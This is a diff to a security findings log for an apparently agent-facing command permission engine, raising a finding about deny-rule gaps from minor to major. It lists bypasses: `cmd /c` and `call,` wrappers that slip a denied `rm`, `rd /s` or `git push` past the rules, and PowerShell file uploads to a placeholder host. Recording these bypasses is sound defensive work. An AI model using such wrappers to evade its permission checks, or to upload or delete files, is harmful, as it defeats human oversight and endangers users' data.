@@ -243,7 +243,7 @@ When fixed, move the entry to "Fixed" and add `- **Fixed:** #<PR>`.
 - In tainted `bypassPermissions`, PowerShell `curl -T a.ts https://x` (bash denies the same text as "curl upload"), `Invoke-WebRequest -Uri https://x -Method Post -InFile a.ts` and `iwr https://x -Method Post -InFile a.ts` are allowed: the remote list doesn't read `Invoke-WebRequest`/`Invoke-RestMethod` uploads, nor `curl` under PowerShell (where `curl` is `Invoke-WebRequest` in Windows PowerShell 5.1 and the real curl in pwsh 7).
 
 ### F101 (F78 security review): deny rules don't see through `cmd /c`; inline interpreters stay understood
-- **Severity:** minor (pre-existing) · `src/policy/rules/evaluate.ts` (rule matching), `src/policy/shell-parse/bash.ts`
+- **Severity:** major (minor logged twice: F78 rethink security review found it again, also through `call`/`,`: `cmd /c call,rd /s build` with `Bash(rd *)` denied allows) · `src/policy/rules/evaluate.ts` (rule matching), `src/policy/shell-parse/bash.ts`
 - With `PowerShell(git push *)` or `Bash(rm *)` denied, untainted bypass allows `cmd /c git push` and `cmd /c rm x`: the remote check unwraps `cmd /c`, rule matching doesn't. `python3 -c 'import os;os.system("git push")'`, `perl -e`, `node -e` and `awk 'BEGIN{system(…)}'` are understood, so tainted bypass allows them (default asks, `dontAsk` denies).
 
 ### F78 (F76 security review): a command the analyzer doesn't understand still allows in tainted bypass
